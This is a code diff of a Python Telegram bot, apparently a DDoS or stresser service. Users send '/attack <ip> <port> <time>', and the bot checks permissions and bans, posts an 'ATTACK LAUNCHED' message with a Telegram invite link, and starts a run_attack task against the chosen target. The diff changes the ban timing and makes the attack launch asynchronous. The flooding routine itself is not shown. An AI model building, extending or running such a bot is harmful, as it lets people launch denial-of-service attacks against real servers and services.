@@ -104,20 +104,15 @@ async def attack(update: Update, context: CallbackContext):
     args = context.args
     now = datetime.now()
 
-    # Admin cannot be banned
-    if user_id == str(ADMIN_USER_ID):
-        await context.bot.send_message(chat_id=chat_id, text="*✅ Admins cannot be banned or restricted.*", parse_mode='Markdown')
-        return
-
     # Check if user is banned
     if user_ban_status.get(user_id, False):
-        ban_end_time = ban_timers[user_id] + timedelta(minutes=ban_duration)
-        if now >= ban_end_time:
-            # Unban the user
+        ban_start_time = ban_timers[user_id]
+        elapsed_minutes = (now - ban_start_time).seconds // 60
+        if elapsed_minutes >= ban_duration:
             user_ban_status[user_id] = False
-            await context.bot.send_message(chat_id=chat_id, text="*✅ Ban lifted. You can use the bot now.*", parse_mode='Markdown')
+            await context.bot.send_message(chat_id=chat_id, text="*✅ Your ban has expired. You can now use the bot.*", parse_mode='Markdown')
         else:
-            remaining_ban = (ban_end_time - now).seconds // 60
+            remaining_ban = ban_duration - elapsed_minutes
             await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ You are banned. Try again in {remaining_ban} minutes.*", parse_mode='Markdown')
             return
 
@@ -126,14 +121,14 @@ async def attack(update: Update, context: CallbackContext):
         await context.bot.send_message(chat_id=chat_id, text="*⚠️ You need permission to use this bot.*", parse_mode='Markdown')
         return
 
-    # Track invalid /attack usage
+    # Handle invalid /attack usage
     if len(args) != 3:
         user_attack_count[user_id] += 1
         if user_attack_count[user_id] >= max_attacks_per_hour:
             user_ban_status[user_id] = True
-            user_attack_count[user_id] = 0  # Reset after ban
             ban_timers[user_id] = now
-            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Banned for {ban_duration} minutes due to spamming invalid /attack commands.*", parse_mode='Markdown')
+            user_attack_count[user_id] = 0  # Reset count after banning
+            await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ You are banned for {ban_duration} minutes due to spamming invalid /attack commands.*", parse_mode='Markdown')
             return
         await context.bot.send_message(chat_id=chat_id, text="*⚠️ Invalid /attack command. Use /attack <ip> <port> <time>*", parse_mode='Markdown')
         return
@@ -144,8 +139,17 @@ async def attack(update: Update, context: CallbackContext):
         await context.bot.send_message(chat_id=chat_id, text=f"*⚠️ Maximum allowed duration is {duration_limit} seconds.*", parse_mode='Markdown')
         return
 
-    user_attack_times[user_id].append(now)
-    await run_attack(chat_id, ip, port, time, context)
+    # Attack launch message
+    await context.bot.send_message(chat_id=chat_id, text=(
+        f"*✅ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐋𝐀𝐔𝐍𝐂𝐇𝐄𝐃 ✅*\n"
+        f"*⭐ Target » {ip}*\n"
+        f"*⭐ Port » {port}*\n"
+        f"*⭐ Time » {time} seconds*\n"
+        f"*https://t.me/+03wLVBPurPk2NWRl*\n"
+    ), parse_mode='Markdown')
+
+    # Run attack asynchronously
+    asyncio.create_task(run_attack(chat_id, ip, port, time, context))
 
 # Run attack process
 async def run_attack(chat_id, ip, port, time, context):
